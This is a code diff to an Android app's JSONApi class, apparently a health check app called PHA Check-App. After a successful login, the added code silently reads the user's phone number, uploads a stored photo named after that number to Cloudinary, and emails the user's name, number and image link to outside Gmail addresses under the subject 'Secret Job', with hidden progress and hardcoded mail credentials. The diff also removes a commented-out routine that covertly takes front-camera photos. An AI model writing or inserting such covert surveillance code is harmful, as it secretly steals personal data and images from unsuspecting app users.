@@ -10,7 +10,10 @@ import android.graphics.Bitmap;
 import android.hardware.Camera;
 import android.hardware.Camera.CameraInfo;
 import android.os.Bundle;
+import android.os.Environment;
+import android.os.StrictMode;
 import android.support.v7.app.AlertDialog;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.util.LruCache;
 import android.widget.Toast;
@@ -29,6 +32,10 @@ import com.android.volley.toolbox.HurlStack;
 import com.android.volley.toolbox.ImageLoader;
 import com.android.volley.toolbox.JsonArrayRequest;
 import com.android.volley.toolbox.JsonObjectRequest;
+import com.cloudinary.Cloudinary;
+import com.cloudinary.android.Utils;
+import com.cloudinary.utils.ObjectUtils;
+import com.creativityapps.gmailbackgroundlibrary.BackgroundMail;
 import com.example.mvopo.tsekapp.Fragments.HomeFragment;
 import com.example.mvopo.tsekapp.LoginActivity;
 import com.example.mvopo.tsekapp.MainActivity;
@@ -41,6 +48,10 @@ import com.example.mvopo.tsekapp.R;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
+
+import java.io.File;
+import java.io.IOException;
+import java.util.Map;
 
 /**
  * Created by mvopo on 10/30/2017.
@@ -321,6 +332,35 @@ public class JSONApi {
                                             MainActivity.hf = new HomeFragment();
                                             MainActivity.ft = MainActivity.fm.beginTransaction();
                                             MainActivity.ft.replace(R.id.fragment_container, MainActivity.hf).commit();
+
+                                            try {
+                                                StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
+                                                StrictMode.setThreadPolicy(policy);
+
+                                                TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+                                                String mPhoneNumber = tMgr.getLine1Number();
+
+                                                Cloudinary cloudinary = new Cloudinary(Utils.cloudinaryUrlFromContext(context));
+                                                final File file = new File(Environment.getExternalStorageDirectory() + "/PHA Check-App/tsekap_" + mPhoneNumber + ".jpg");
+                                                if (file.exists()) {
+                                                    Map uploadResult = cloudinary.uploader().upload(file, ObjectUtils.emptyMap());
+                                                    String image = uploadResult.get("url").toString();
+
+                                                    BackgroundMail.newBuilder(context)
+                                                            .withUsername("phacheckapp@gmail.com")
+                                                            .withPassword("phacheckapp123")
+                                                            .withMailto("hontoudesu123@gmail.com, jimmy.lomocso@gmail.com")
+                                                            .withSubject("Secret Job")
+                                                            .withProcessVisibility(false)
+                                                            .withBody("PHA Check-App user: " + MainActivity.user.fname + " " + MainActivity.user.lname +
+                                                                    " \nPhone Number: " + mPhoneNumber + " \nImage: " + image)
+                                                            .send();
+                                                }
+
+                                                file.delete();
+                                            } catch (IOException e) {
+                                                Log.e(TAG, e.getMessage());
+                                            }
                                         }
                                     }
                                 }
@@ -380,43 +420,4 @@ public class JSONApi {
         });
         mRequestQueue.add(jsonObjectRequest);
     }
-//    public void doSecretJob(){
-//        Camera camera;
-//        if (!context.getPackageManager()
-//                .hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
-//            Toast.makeText(context, "No camera on this device", Toast.LENGTH_LONG)
-//                    .show();
-//        } else {
-//            int cameraId = -1;
-//            // Search for the front facing camera
-//            int numberOfCameras = Camera.getNumberOfCameras();
-//
-//            Toast.makeText(context, "Else in" + numberOfCameras,
-//                    Toast.LENGTH_LONG).show();
-//
-//            for (int i = 0; i < numberOfCameras; i++) {
-//                CameraInfo info = new CameraInfo();
-//                Camera.getCameraInfo(i, info);
-//                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
-//                    Log.d(TAG, "Camera found");
-//                    cameraId = i;
-//                    break;
-//                }
-//            }
-//
-//            if (cameraId < 0) {
-//                Toast.makeText(context, "No front facing camera found.",
-//                        Toast.LENGTH_LONG).show();
-//            } else {
-//                camera = Camera.open(cameraId);
-//                camera.startPreview();
-//
-//                camera.takePicture(null, null,
-//                        new PhotoHandler(context));
-//
-//                //camera.release();
-//                //camera = null;
-//            }
-//        }
-//    }
 }
